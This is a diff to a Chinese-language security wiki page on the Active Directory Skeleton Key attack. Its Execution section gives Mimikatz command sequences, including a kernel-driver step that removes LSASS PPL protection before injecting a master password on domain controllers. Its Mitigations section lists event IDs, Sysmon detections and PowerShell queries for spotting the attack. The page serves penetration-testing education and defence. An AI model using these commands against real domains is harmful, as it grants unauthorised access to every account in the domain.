@@ -4,28 +4,51 @@
 
 ## Skeleton Key Attack
 
-**Skeleton Key 攻击**是一种复杂的技术，允许攻击者通过**将主密码注入域控制器**来**绕过 Active Directory 认证**。这使得攻击者能够**以任何用户的身份进行认证**而无需他们的密码，从而**授予他们对域的无限制访问**。
+**Skeleton Key attack** 是一种技术，允许攻击者通过将一个主密码注入到每个 domain controller 的 LSASS 进程来**绕过 Active Directory authentication**。注入后，该主密码（默认 **`mimikatz`**）可用于以**any domain user** 身份进行认证，同时他们的真实密码仍然有效。
 
-可以使用 [Mimikatz](https://github.com/gentilkiwi/mimikatz) 执行此攻击。进行此攻击的**前提是拥有域管理员权限**，攻击者必须针对每个域控制器以确保全面的突破。然而，攻击的效果是暂时的，因为**重启域控制器会消除恶意软件**，需要重新实施以维持访问。
+Key facts:
 
-**执行攻击**只需一个命令：`misc::skeleton`。
+- 需要在每个 DC 上拥有 **Domain Admin/SYSTEM + SeDebugPrivilege**，并且必须在**每次重启后重新应用**。
+- 会修补 **NTLM** 和 **Kerberos RC4 (etype 0x17)** 的验证路径；仅支持 AES 的域或强制使用 AES 的账户将**不接受 skeleton key**。
+- 可能与第三方 LSA authentication packages 或额外的 smart‑card / MFA providers 存在冲突。
+- Mimikatz 模块接受可选开关 `/letaes`，以在兼容性问题时避免触及 Kerberos/AES 钩子。
 
-## Mitigations
+### Execution
 
-针对此类攻击的缓解策略包括监控特定事件 ID，以指示服务的安装或敏感权限的使用。具体来说，查找系统事件 ID 7045 或安全事件 ID 4673 可以揭示可疑活动。此外，将 `lsass.exe` 作为受保护的进程运行可以显著阻碍攻击者的努力，因为这要求他们使用内核模式驱动程序，从而增加攻击的复杂性。
+经典、非‑PPL 保护的 LSASS:
+```text
+mimikatz # privilege::debug
+mimikatz # misc::skeleton
+```
+如果 **LSASS is running as PPL** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS)，需要一个内核驱动来在修补 LSASS 之前移除保护：
+```text
+mimikatz # privilege::debug
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
+mimikatz # misc::skeleton                               # inject master password 'mimikatz'
+```
+注入后，使用任意域账户进行身份验证，但使用密码 `mimikatz`（或操作者设置的值）。在多域控制器环境中，记得在**所有 DCs**上重复。
 
-以下是增强安全措施的 PowerShell 命令：
+## 缓解措施
 
-- 要检测可疑服务的安装，请使用：`Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
+- **日志监控**
+- System **Event ID 7045**（服务/驱动安装），针对未签名驱动，例如 `mimidrv.sys`。
+- **Sysmon**：Event ID 7（驱动加载）用于 `mimidrv.sys`；Event ID 10 用于检测来自非系统进程对 `lsass.exe` 的可疑访问。
+- Security **Event ID 4673/4611** 用于检测敏感权限使用或 LSA 身份验证包注册异常；与来自 DCs 的使用 RC4 (etype 0x17) 的异常 4624 登录相关联。
+- **加固 LSASS**
+- 在 DCs 上保持启用 **RunAsPPL/Credential Guard/Secure LSASS**，以迫使攻击者采用内核模式驱动部署（更多遥测，更难被利用）。
+- 尽量禁用旧的 **RC4**；将 Kerberos 票证限制为 AES 可以阻止 skeleton key 使用的 RC4 hook 路径。
+- 快速 PowerShell 搜索：
+- 检测未签名的内核驱动安装： `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
+- 查找 Mimikatz 驱动： `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
+- 验证重启后是否强制启用 PPL： `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`
 
-- 特别是，要检测 Mimikatz 的驱动程序，可以使用以下命令：`Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
-
-- 为了加强 `lsass.exe`，建议将其启用为受保护的进程：`New-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -Value 1 -Verbose`
-
-在系统重启后进行验证至关重要，以确保保护措施已成功应用。这可以通过以下命令实现：`Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*`
+有关其他凭据加固指导，请查看 [Windows credentials protections](../stealing-credentials/credentials-protections.md)。
 
 ## References
 
-- [https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
+- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
+- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
+- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)
 
 {{#include ../../banners/hacktricks-training.md}}
